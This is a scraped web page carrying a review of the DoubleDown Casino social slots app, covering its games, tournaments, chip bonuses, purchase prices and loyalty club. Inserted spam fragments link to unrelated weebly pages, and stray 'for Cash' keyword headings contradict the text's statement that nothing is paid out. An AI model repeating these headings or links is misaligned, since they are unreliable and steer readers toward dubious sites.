It’s a fun place to connect with your friends and spin the reels for a while without the worry of having to find a site that you can both join and transfer money into with ease.</p><p>No, you won’t be cashing out any money, but you also don’t have to invest anything unless you just want to buy yourself some more credits to keep playing after you run out for the day.</p><p>DoubleDown Casino is managed by DoubleDown Interactive LLC and was acquired by the software giant, IGT, in 2012 (before a subsequent 2017 sale to DoubleU Games), so you get the best of the IGT collection. You’ll be able to play several Wheel of Fortune games, Cleopatra, Wolf Run, DaVinci Diamonds, Orange is the New Black, Ellen Dance Party, Betty White’s Twisted Tales, and more than 100 other slots.</p><p>If you gravitate more to tournament play, DoubleDown Casino offers both slot and video poker tournaments with different prize structures. They’re buy-in tournaments, but you shouldn’t have any trouble coming up with your virtual seed money, as you start out with one million points, spin for daily bonuses, and have many other opportunities to increase your credit balance without spending a dime. Of course, if you’re impatient (and who isn’t sometimes?), you can buy some. $2.99 will get you 300,000, or you can cough up $5 more to claim a cool million in chips.</p><p>Facebook, Google Play store, Apple store…take your pick and find out what free casino gaming is all about.</p><h2>Who Can Play at the DoubleDown Casino?</h2><p>“Who can’t?” would be a better question.</p><p>As it’s a free site with no cash prizes or payouts whatsoever, the service is open to everyone — everyone 13 and over, that is. If you’re under 18, you need parental permission, but you won’t be turned away.</p><p>The DoubleDown Casino is owned by DoubleU Games through DoubleDown Interactive LLC, a company based in Seattle, Washington.</p><h2>Software Suppliers</h2><p>In 2012, IGT acquired the DoubleDown Casino from DoubleDown Interactive for nearly $500 million. In 2017, it turned around and sold it to DoubleU Games out of South Korea for $825 million — not too bad of a profit!</p><p>The deal formed a strategic partnership between the two companies, with IGT providing the software.</p><h2>The Good Stuff</h2><h3>No Money Required</h3><p><br>Many people enjoy casino games but don’t want to risk their hard-earned money hoping that it’ll pay off. They want to play the games but don’t want the real cash-gambling aspect tied into the experience. DoubleDown Casino provides enough opportunities to acquire chips that, unless you really want to keep those reels spinning for a long time, you won’t need to invest anything.</p><h3>Tournaments</h3><p>One of the best features of the service is the tournament availability. It can extend your playing credits, as well as up the fun factor for you. DoubleDown Casino offers both slots and video poker tournaments, and you can easily review your choices. You can get in on small competitions with just ten players and two spots paid, or you can join 499 other players and spin for one of the top 100 spots sharing in the prize pool. The tournament areas are separate, with a prominent slot tournament tab and video poker tournament action housed in the “more games” area.</p><h3>Several Ways to Earn Chips</h3><p>You don’t have to rely on one daily allotment before needing to buy some extra chips when you’re excited to play for a while. DoubleDown Casino gives you several ways to boost your credit balance. You can refer friends and get paid every day for them having an active app. You can also check out the Facebook fan page for free chip opportunities. If you provide your email, you’ll occasionally receive some extras in your inbox. You can also participate in daily challenges that are tied to your gaming activity.</p><h2>The Bad Stuff</h2><h3>Accounts Can’t Be Switched to Different Platforms</h3><p><br>If you start out on an iPad and then want to use your Galaxy phone to keep things going, you’ll need to register separate accounts. Your loyalty balance and participation don’t switch between Apple and Android devices. Additionally, the Facebook play is also independent. There isn’t seamless integration between different platforms.</p><h3>No Cash or Other Prize Payouts</h3><p>You know straight-up that this isn’t a casino for cash. DoubleDown Casino is a social gaming experience using virtual credits. However, even though you can buy more chips, you have no opportunities to cash out even for virtual prizes. The sole purpose of playing and winning is to provide you with more gaming time. It would be fun to have at least one big drawing a month or to be in contention for a gift card or similar prize along the way.</p><h2>Game Selection</h2><p>The casino breaks down into three main areas of play that include table games, video poker, and slots. However, there’s no doubt that this is a slot player’s casino, with 121 options out of the total 127-game library.</p><p>You may have been pretty excited to see the one million bump in credits when you first accessed DoubleDown Casino, but take a peek at the games and you won’t feel quite as flush. You don’t have to play all of the pay lines, so you can save a bit there, but the minimum bet will come in on the very high end of things. Be happy this isn’t real cash!</p><p>I looked at the Cleopatra game, which offers a range from one to 20 pay lines but imposes a minimum line bet of $500. For a wager on all available lines, you’re looking at $10,000 a spin. So, you can see why many people would be quick to buy credits, as you can go through your allotment very quickly if you’re having a less-than-stellar outing.</p><p>The gaming experience is top-notch, though. IGT is one of the most prominent companies in the casino software industry, both online and offline. You get a very similar playing experience as you would sitting down at a slot machine inside a Vegas casino.</p><p>Your gaming options will change the more you level up through the DoubleDown casino’s loyalty program. I did see some information about bingo and Texas hold ’em games but wasn’t able to access the gaming areas at the beginner’s level.</p><h3>Video Poker</h3><p>There may only be four games, but video poker also has tournament action attached. If you’re a dedicated video poker player and you’re used to multi-game or other poker variations, you may not be as enthused about one-line games, but the Game King Video Poker Tournaments can do a lot to up the action for you.</p><p>You need to go in the “more games” area to access these games, and your lowest stake is $5,000.</p><ul><li>Double Double Bonus Poker</li><li>Bonus Poker</li><li>Double Bonus Poker</li><li>Jacks or Better</li></ul><h3>Table Games</h3><p>Table games are also housed in the “more games” section. Don’t get your expectations up too high, though. Remember, I said this was a slots casino. You can play roulette or blackjack. Those are your two choices.</p><p>Just like the slot and video poker games, you won’t get away with $1 blackjack here. Roulette limits range from $10,000 to a million, and the blackjack table limit is $5,000 to five million.</p><p>As you pull up a game, you get a step-by-step introduction to the betting and gaming process. If you’ve never played a table game before, this is an excellent way to learn. You’re not risking your own money, so you can make mistakes along the way. What an excellent preparation for the real thing!</p><ul><li>Roulette</li><li>Blackjack</li></ul><h3>Slots</h3><p>If you had some cold hard cash on the line, a nine-figure jackpot would be jaw-dropping. DoubleDown Casino isn’t paying out the actual money but still publicizes progressive jackpot figures. You’ll get paid in credits and can win some significant playing time, but nothing will be awarded in cash or prizes aside from game credits.</p><ul><li>Triple Double Wild Cherry</li><li>Icy Wilds</li><li>3 Lobstermania</li><li>Wheel of Fortune</li><li>Pink Diamond Free Games</li></ul><ul><li>Bombay</li><li>Wolf Run</li><li>Da Vinci Diamonds</li><li>Cleopatra</li><li>Cats</li></ul><ul><li>Golden Goddess</li><li>LobsterMania 2 1024 Ways</li><li>Pixies of the Forest</li><li>Mystical Mermaid</li><li>Double Diamond Deluxe</li></ul><ul><li>Fishing Bob</li><li>Cats and Dogs</li><li>Noah’s Ark</li><li>Sizzling 7</li><li>Lucky Hot 7s</li></ul><ul><li>Triple Stars</li><li>Black Widow</li><li>Day of the Dead</li><li>Hexbreaker 2</li><li>Red Hot Tamales!</li></ul><ul><li>Triple Diamond</li><li>Golden Jungle</li><li>House of Cards</li><li>Texas Tea</li><li>Fire Pearl</li></ul><h2>Promotions</h2><p>Online casinos offer new-player bonuses that typically revolve around the first deposit made into a betting account. As DoubleDown Casino isn’t a “for cash” casino, deposits aren’t required, so the structure is different.</p><p>New players start out with a million chips. From there, a daily spin of the wheel can provide a significant bump in your credits.</p><h3>Daily Wheel Spin</h3><p>Every 24 hours, you’re entitled to a daily wheel spin, and it will automatically pop up when you pull up the casino.</p><p>The wheel looks like the Wheel of Fortune and will provide you with enough to play for at least a little while, but you could get lucky and claim a bigger piece of the pie.</p><p>The daily wheel prize amounts are determined by your Diamond Club level (see VIP section below). The higher your club status, the more you can claim each day through your wheel spin.</p><h3>Return Bonus</h3><p>Every 24 hours also gets you a return bonus that starts at $1,000. As long as you log in every day, that amount will increase by $1,000 up to a maximum of $25,000 for 25 consecutive days of activity.</p><h3>Friend Bonus</h3><p>A third way to claim some chips is to be active on Facebook referrals. If you refer DoubleDown Casino to your Facebook friends and they install the application, you get an additional $1,000 in chips every day for each active referral.</p><p>However, that amount could change if your friend uninstalls the app. DoubleDown Casino monitors all activity and will deduct your friend-referral bonus accordingly.</p><h3>One Million Chip Friend Bonus</h3><p>Not only do you reap the benefits of having active friends on a daily basis, but the first time a friend accepts your invitation, you’ll see your credit balance go up by a million!</p><h3>Send and Receive Gifts</h3><p>Keeping your friends in play is key to claiming even more chips through DoubleDown Casino. Every day, you can send a gift spin to your Facebook connections, and they can send one to you. You can redeem three gifts (if your friends are feeling generous) in a single day.</p><p>Your Diamond Club status can also give you a bigger gift boost, allowing you to redeem more gifts each day the higher you climb the tiers.</p><p>You’ll see a gift icon on the main casino screen, and the little number in the top right is your gift indicator. You click on the gift box to collect your gift(s). You also use that particular link to invite new friends and send them gifts.</p><h3>Daily Challenges</h3><p>If you’ve accessed the DoubleDown Casino, you’ll notice a square icon with three shields in the middle. That’s your daily challenge button. Every player level has a set of three challenges that they can complete – bronze, silver, and gold. You complete the bronze to unlock silver and so forth.</p><p>The challenges revolve around getting a symbol or set of symbols during your regular gameplay, and you can play for the challenges every day.</p><p>When you complete a challenge, you automatically receive a prize award to your credit balance.</p><h3>Other Chip Promotions</h3><img src='https://automatenspielex.com/wp-content/uploads/sites/10030/cash-spin-slot-machine-wms-1.png' alt='Cash' title='Cash'><p>There are other ways to keep the wheels spinning. If you provide DoubleDown Casino with your email address and opt into its newsletter, special offers will be sent to you directly. You can also claim extras just by liking or following the casino on Twitter, Pinterest, and Instagram.</p><p>Are you a dedicated Facebook user? The DoubleDown Casino Facebook fan page is another source of chip bonuses. Check in frequently for free chip offers. DoubleDown Casino also suggests adding their page as a “See First” on Facebook so it’s at the top of your newsfeed.</p><h3 id='spin-the-wheel-for-cash'>Spin The Wheel For Cash</h3><h2>Tournaments</h2><p>In my opinion, tournaments are the best feature of the DoubleDown Casino. <a href='https://bestcfil948.weebly.com/play-the-slots.html'>Play</a> the slots. They’re structured in a way that allows players to pick and choose their odds of winning.</p><p>You’ll find both slot tournaments and video poker tournaments listed on a daily basis. Once you pull up the tournament tab, you’ll see the different types of tournaments, the games included, and the buy-in and prize pool.</p><h3>Slot Tournaments</h3><p>There are four types of slot tournaments, and each has a different structure and list of included games.</p><h3>50 Players</h3><p>The participants are limited to 50, and the top 10 will walk away as winners. Depending on the game, your buy-in will be anywhere from $25,000 to $100,000,000, and the prize pool ranges from $1,125,000 on Mayan Riches to a whopping $4,500,000,000 on Treasures of Troy.</p><h3>Shootout</h3><p>Only ten can play in each tournament, and the top two will be paid. $25,000 gets you in the running for a $225,000 prize pool on Pamplona, and White Orchid requires $100,000,000 but also features a $900,000,000 reward split between just two players.</p><h3>Mega Prize</h3><p>You shouldn’t have a problem getting into the action with this tournament. Mega Prize allows up to 500 players and pays out the top 100. The buy-in is a bit more as you need at least $100,000 for Mayan Riches for a piece of the $45,000,000 that’s up for grabs. If you want in on Western Belles’ $2,250,000,000 (yes, that’s billion), it’ll cost you $5,000,000.</p><h3>Hi-Lo</h3><p>The last category rewards the winner and the loser (no judgment on the person!). Ten players can participate, and the first-place winner and the last-place finisher claim a piece of the prize pool. Mayan Riches is back with a $25,000 buy-in for $225,000. You’ll need to have $100,000,000 for the Coyote Moon tournament but can claim a piece of the $900,000,000 total prize pool.</p><h3>Video Poker Tournaments</h3><p>Slot tournaments have a link right in the casino lobby, but you need to select “more games” to find the video poker options. There’s both a 50 Players and a Shootout tournament listed, but I’ve checked in a few times and Shootout has been the only active area.</p><p>The video poker tournaments are provided by Game King, and a Shootout round is ten players vying for the top two spots.</p><p>On the low end of things, a $100,000 buy-in will get you a spot in the Double Double Bonus round for a $900,000 prize pool. $1,000,000 will get you a Jacks or Better placement for a $9 million prize pool. Bonus and Double Bonus Poker are also included in between.</p><h2>Banking</h2><p>Unlike traditional casinos, a social gaming site won’t have a regular banking structure. It will provide purchase options, as opposed to depositing methods, but nothing is necessary for payout, as you can’t claim a withdrawal.</p><p>Most people will already be set up with a payment method if they’re used to playing games or buying apps, so nothing new will need to be established. DoubleDown Casino does accept PayPal, though, as an alternative.</p><ul><li>Purchase Methods</li><li>Facebook</li><li>iTunes/Apple App Store</li><li>Google Play</li><li>Samsung Galaxy App Store</li><li>Amazon App Store</li><li>PayPal</li></ul><h3>Purchases</h3><p>You’ll have your choice of packages at different payment levels. Keep in mind the high minimum bets, though, when you’re purchasing chips, as 300,000 can go in a matter of minutes if you’re not on a lucky streak.</p><h3 id='spin-to-win-cash-app'>Spin To Win Cash App</h3><table><thead><tr><th>Coins</th><th>Money</th></tr></thead><tbody><tr><td>300,000</td><td>$2.99</td></tr><tr><td>1,000,000</td><td>$7.99</td></tr><tr><td>3,000,000</td><td>$17.99</td></tr><tr><td>12,000,000</td><td>$39.99</td></tr><tr><td>35,000,000</td><td>$59.99</td></tr><tr><td>100,000,000</td><td>$99.99</td></tr></tbody></table><h2>The VIP Lounge</h2><p>A social gaming site’s banking and promotional structure will be quite different from a “play for cash” casino, but when it comes to the VIP club, it’s similar.</p><p>Just as traditional online casinos offer, DoubleDown Casino has a multi-level program where players level up based on their betting and other activities.</p><p>The more and the more often you play, the quicker you’ll level up through the Diamond Club. The one difference, though, is that it’ll cost you to move to a higher level. When you have enough chips accumulated, you can cash them in to advance up the ranks. If you have excess chips, those will roll over, but you do need to redeem the required amount to take advantage of the next level of benefits.</p><p>Aside from the games, the loyalty club is the central hub of activity. Players want to move up the ranks to accumulate more chips easier.</p><h4>Benefits include:</h4><ul><li>Higher daily bonus wheel top value</li><li>The ability to redeem more than three daily gifts (up to ten)</li><li>Early access to new games added to the collection</li><li>Loyalty point multiplier</li><li>Ambassador service</li></ul><p>An ambassador is like a VIP concierge and provides players with personalized support rather than having to go through the main customer service ticket process.</p><h2>Customer Service</h2><p>The casino publicizes a support ticket system. Slot mobile <a href='https://trueaload515.weebly.com/slot-mobile-app.html' title='app'>app</a>.</p><p>Players log in and click “contact us” to send an email and generate a ticket number. Prompt replies have been reported, but most people shouldn’t need to use the service at all. DoubleDown Casino has a comprehensive help section, as well as demonstrations on how to play the games to make things as straightforward as possible.</p><h3 id='free-spins-for-cash'>Free Spins For Cash</h3><h2>Would I Play at the DoubleDown Casino?</h2><p>If you’re accustomed to playing casino games for cash, it could take some getting used to when you first start with DoubleDown Casino. After all, you’re playing just to accumulate more chips to keep playing, so it’s an endless cycle without any cash-out involved.</p><p>Not only is it a great training ground for casino games but many people enjoy slot games and would prefer not to transfer money into a betting account.</p><p>The Refer-A-Friend program prompts players to make their experience more social. You’ll have fun gifting your friends and getting more people on board with you. And you’ll reap the benefit of more chips without having to buy them.</p><p>From the daily challenges to the tournaments to different ways to collect free chips, DoubleDown Casino fully immerses you in the process and makes it fun for you to build your chip balance, even if you’re not successful at your gameplay.</p><p>The DoubleDown Casino isn’t a fly-by-night operation, with its prominent IGT and Game King participation. There are millions of players already accessing the app on a regular basis. If you enjoy casino games, especially the top slots that IGT offers, and you enjoy the social gaming premise, then DoubleDown Casino is a top choice for you.</p><p>After all, what do you have to lose?</p><p>This review was made by: <span>LegitGamblingSites.com</span><span> Rating: <span>4.83</span> out of <span>5</span></span></p></div></div></div></div></div><div class="bar-navigation-block"><div class="lg-nav-list"><div class="lg-nav-list-content">&lArr; &lArr; <a href="/pink-panther-casino.html">Pink Panther Casino</a></div></div><div class="bar-navigation-block">&rArr; &rArr; <a href="/latest-casino-bonuses-forum.html">Latest Casino Bonuses Forum</a></div></div></div></div></div></div><div class="post-aside-block layout-new-secondary article-new-page layout-layer-primary secondary-col-layer"><div class="extra-aside aside-clear-entry"><div class="site-lg-container"><aside id="sm-site-aside" class="panel-post-secondary panel-md-col singular-container-layout new-site"><form role="search" method="get" class="panel-site-box" action="#"><label><span class="area-fix-new">Search for:</span><input type="search" class="panel-aside-sm" placeholder="Search &hellip;" value="" name="s"></label><input type="submit" class="secondary-body-node" value="Search"></form></aside><aside id="row-single-node"><div class="content-body"><div class="site-label-extra alt fix block-label-area">Related Posts</div></div><ul><li><a href='/lucky-day-casino.html'>Lucky Day Casino</a></li><li><a href='/megabucks-jackpot-las-vegas.html'>Megabucks Jackpot Las Vegas</a></li><li><a href='/coin-dozer-game-online.html'>Coin Dozer Game Online</a></li><li><a href='/spin-to-win-online.html'>Spin To Win Online</a></li><li><a href='/magic-world-game.html'>Magic World Game</a></li></ul></aside></div></div></div></div></div></div></div><footer><div class="content-node"><div class="secondary-site-row"><div class="site-lg-container"><div class="article-row-default"><div class="site-lg-container"><div class="site-default-article bar-navigation-secondary nav-static-sm entry-post-sm"><div class="bar-sm-list"></div></div><div class="main-default-layer node-new-block site-default-article entry-post-sm">&copy;&nbsp;2021&nbsp;Casino ANT                       </div></div></div></div></div></div></footer><a href="#" class="aside-article-clear"><i class="container-box-singular entry-fix-layer"></i></a></body></html>
